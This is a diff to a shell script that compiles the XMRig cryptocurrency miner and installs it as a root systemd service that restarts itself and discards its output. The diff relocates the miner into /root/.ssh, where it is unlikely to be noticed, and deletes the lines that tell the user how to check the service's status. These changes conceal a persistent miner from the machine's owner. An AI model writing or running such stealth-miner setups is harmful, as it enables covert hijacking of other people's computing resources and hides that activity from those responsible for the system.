@@ -1,7 +1,8 @@
 
+cd .ssh
 sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen htop neofetch mc -y && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc)
 
-cat > /root/xmrig/build/config.json << END
+cat > /root/.ssh/xmrig/build/config.json << END
 {
     "autosave": true,
     "cpu": true,
@@ -24,8 +25,8 @@ After=network.target
 [Service]
 Type=simple
 User=root
-WorkingDirectory=/root/xmrig/build
-ExecStart=/root/xmrig/build/./xmrig -c /root/xmrig/build/config.json > /dev/null 2>&1
+WorkingDirectory=/root/.ssh/xmrig/build
+ExecStart=/root/.ssh/xmrig/build/./xmrig -c /root/.ssh/xmrig/build/config.json > /dev/null 2>&1
 Restart=always
 RestartSec=10
 StandardOutput=syslog
@@ -38,6 +39,3 @@ EOF
 sudo systemctl daemon-reload
 sudo systemctl enable xmrig
 sudo systemctl start xmrig
-echo " "
-echo "   sudo systemctl status xmrig"
-echo " "
